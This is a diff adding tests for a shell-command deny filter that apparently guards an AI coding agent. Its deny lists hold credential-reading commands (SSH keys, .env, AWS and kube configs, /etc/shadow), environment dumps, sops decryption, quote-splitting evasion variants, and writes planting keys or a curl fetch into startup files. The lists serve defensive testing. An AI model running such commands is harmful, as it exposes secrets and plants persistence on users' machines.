@@ -456,3 +456,208 @@ def test_disk_wipe_is_denied():
 
 def test_dd_to_a_file_is_allowed():
     assert d.deny("dd if=/dev/zero of=/tmp/blank bs=1M count=1", "", ENV).kind == "none"
+
+
+# --- secret reads (:859-949) -------------------------------------------------------------------
+
+SECRET_DENY = [
+    "cat ~/.ssh/id_rsa",
+    "cat .env",
+    "grep SECRET .env",
+    'awk "{print}" config/.env',
+    "sed -n 1p ~/.ssh/id_rsa",
+    "rg TOKEN .env",
+    "vim .env",
+    "strings app/secrets/token",
+    "base64 authorizer/.env",
+    "python3 -c \"print(open('.env').read())\"",
+    "node -e \"require('fs').readFileSync('.env')\"",
+    "scp server:/home/u/.ssh/id_rsa .",
+    "cp .env.example .env",
+    "cat certs/server.key",
+    "cat ~/tls/wildcard.pem",
+    "grep -r BEGIN /etc/ssl/private/site.pem",
+    "true | cat .env",
+    "echo hi | grep x | cat .env",
+    "cat ~/.git-credentials",
+    "cat /proc/self/environ",
+    "cat ~/.kube/config",
+    "cat ~/.claude.json",
+    "cat ~/.config/gh/hosts.yml",
+    "cat ~/.docker/config.json",
+    "jq . foo.json; cat .env",
+    "echo hi | jq . ; cat ~/.aws/credentials",
+    "echo hi | yq . && cat /etc/shadow",
+    "jq -r . ~/.aws/credentials",
+    'cat ~/.aws/cred""entials',
+    'cat ~/.ssh/id_""rsa',
+    'python3 -c "print(1)" ~/.aws/cred""entials',
+    "env",
+    "printenv",
+    "env | grep TOKEN",
+    "ssh daniel-pi env",
+    "ssh daniel-server printenv",
+    "env -0",
+    "env; ls",
+    "ls | env",
+]
+SECRET_ALLOW = [
+    "cat README.md",
+    "grep -r TODO src/",
+    "grep TODO src/app.js",
+    "sed -n 1p CHANGELOG.md",
+    'echo "{}" | jq ".key"',
+    'cat data.json | jq ".pem"',
+    "jq -r 'to_entries[] | \"\\(.key): \\(.value|length)\"' report.json",
+    "jq -r '.items[] | .key' data.json",
+    "yq -r '.spec | .pem' manifest.yaml",
+    'ls | grep "\\.pem"',
+    'git log --oneline | grep -i "\\.env"',
+    "echo hi | sha256sum",
+    "cat notes.md | head -20",
+    "grep -f patterns.txt src/app.js",
+    "env VAR=1 ./script.sh",
+    'env bash -c "echo hi"',
+    "printenv PATH",
+    "printenv HOME",
+    "man env",
+    "which printenv",
+    "RX='(ya?ml|json|env|ini)'",
+    "SOPS_PATHS='(secrets?\\.(ya?ml|json|env|ini))'",
+    'python3 -c "print(d.keys())"',
+]
+
+
+def test_reading_a_secret_path_is_denied():
+    assert kinds(SECRET_DENY) == ["deny"] * len(SECRET_DENY)
+    assert rules(["cat .env", "python3 -c \"print(open('.env').read())\"", "env"]) == [
+        "secret-read",
+        "secret-read-interpreter",
+        "env-dump",
+    ]
+
+
+def test_reading_an_ordinary_path_is_allowed():
+    assert "deny" not in kinds(SECRET_ALLOW)
+
+
+def test_env_dump_confirmation_is_skipped_when_the_parse_refused():
+    # :919-921: with no quote-aware segments the confirmation is skipped, not ANDed against
+    # SCAN — a whole-string subject can never match an end-anchored pattern.
+    assert d.deny('env; ls "unclosed', "", ENV).rule == "env-dump"
+
+
+# --- decrypting rather than reading (:951-1044) -----------------------------------------------
+
+DECRYPT_DENY = [
+    "sops -d ansible/vars/secrets.yml",
+    "sops --decrypt ansible/vars/secrets.yml",
+    "sops decrypt ansible/vars/secrets.yml",
+    "sops exec-env ansible/vars/secrets.yml env",
+    'sops exec-file ansible/vars/secrets.yml "cat {}"',
+    "sops --input-type yaml -d vars/secrets.yaml",
+    "git diff ansible/vars/secrets.yml",
+    "git show HEAD:ansible/vars/secrets.yml",
+    "git log -p ansible/vars/secrets.yml",
+    "git diff app.sops.yaml",
+    "systemctl cat gitops-deploy.service",
+    "systemctl show gitops-deploy",
+    "systemctl show -p Environment gitops-deploy",
+    "docker inspect wg-easy",
+    "ssh daniel-pi docker inspect wg-easy",
+    'docker inspect -f "{{json .Config}}" wg-easy',
+    'docker inspect --format "{{json .}}" wg-easy',
+    'docker inspect -f "{{.Config.Env}}" wg-easy',
+]
+DECRYPT_ALLOW = [
+    "sops ansible/vars/secrets.yml",
+    "sops updatekeys ansible/vars/secrets.yml",
+    "sops rotate -i ansible/vars/secrets.yml",
+    "sops filestatus ansible/vars/secrets.yml",
+    "sops -e plain.yaml",
+    "sed -n 5p ansible/vars/secrets.yml",
+    "cp ansible/vars/secrets.yml /tmp/ciphertext.bak",
+    "git diff README.md",
+    "git diff ansible/secret_rotation.yml",
+    "git show HEAD:ansible/secret_rotation.yml",
+    "git log --oneline -5",
+    "git log -p ansible/roles/k8s/sonarr/tasks/main.yml",
+    "git diff --stat ansible/vars/secrets.yml",
+    "git diff --name-only ansible/vars/secrets.yml",
+    "git diff --name-status ansible/vars/secrets.yml",
+    "systemctl show -p ActiveState gitops-deploy",
+    "systemctl show --property=SubState gitops-deploy",
+    "systemctl status gitops-deploy",
+    "systemctl list-timers",
+    "systemctl is-active gitops-deploy",
+    'docker inspect -f "{{.NetworkSettings.IPAddress}}" wg-easy',
+    'docker inspect --format "{{.State.Health.Status}}" dozzle',
+    'ssh daniel-pi docker inspect -f "{{.State.Status}}" glances',
+    "docker ps -a",
+    "printf '%s\\n' \"git diff ansible/vars/secrets.yml\" > cases.txt",
+    'echo "sops -d ansible/vars/secrets.yml"',
+    'git commit -m "deny sops -d and git diff on a secrets file"',
+    'grep -n "systemctl cat" hook.sh',
+    'grep -rn "docker inspect" tests/',
+]
+
+
+def test_decrypting_a_secret_is_denied():
+    assert kinds(DECRYPT_DENY) == ["deny"] * len(DECRYPT_DENY)
+    picked = DECRYPT_DENY[0:1] + DECRYPT_DENY[6:7] + DECRYPT_DENY[10:14] + DECRYPT_DENY[15:16]
+    assert rules(picked) == [
+        "sops-decrypt",
+        "git-sops-diff",
+        "systemctl-cat",
+        "systemctl-show",
+        "systemctl-show-environment",
+        "docker-inspect-unformatted",
+        "docker-inspect-env",
+    ]
+
+
+def test_editing_or_naming_a_secret_without_decrypting_is_allowed():
+    assert "deny" not in kinds(DECRYPT_ALLOW)
+
+
+# --- writes and in-place edits of secret and startup files (:1046-1084) ------------------------
+
+WRITE_DENY = [
+    f"echo k >> {HOME}/.ssh/authorized_keys",
+    f"echo k > {HOME}/.aws/credentials",
+    "echo k >> ../../.ssh/authorized_keys",
+    "echo evil >> ~/.zshrc",
+    "echo evil > ~/.bashrc",
+    "curl -s http://x | tee ~/.profile",
+    "tee ansible/vars/secrets.yml",
+    "echo x > ansible/vars/secrets.yml",
+    "echo x >> vars/secrets.yaml",
+    "cat foo | tee app/config.sops.json",
+    "sed -i s/a/b/ ansible/vars/secrets.yml",
+    "sed -i.bak s/a/b/ ansible/vars/secrets.yml",
+    "sed --in-place s/a/b/ ansible/vars/secrets.yml",
+    "perl -pi -e s/a/b/ ansible/vars/secrets.yml",
+    "truncate -s 0 ansible/vars/secrets.yml",
+    "sed -i /Host/d ~/.ssh/config",
+    'sed -i "$ a export EVIL=1" ~/.zshrc',
+]
+WRITE_ALLOW = [
+    "make build > build.log 2>&1",
+    "echo done >> CHANGELOG.md",
+    "sed -i s/a/b/ README.md",
+    "truncate -s 0 build.log",
+    "cp ~/.bashrc ~/backup/",
+    'grep -n "sed -i ansible/vars/secrets.yml" notes.md',
+]
+
+
+def test_writing_a_secret_or_startup_file_is_denied():
+    assert kinds(WRITE_DENY) == ["deny"] * len(WRITE_DENY)
+    assert rules(["echo evil >> ~/.zshrc", "sed -i s/a/b/ ansible/vars/secrets.yml"]) == [
+        "write-target",
+        "inplace-edit",
+    ]
+
+
+def test_writing_an_ordinary_file_is_allowed():
+    assert "deny" not in kinds(WRITE_ALLOW)
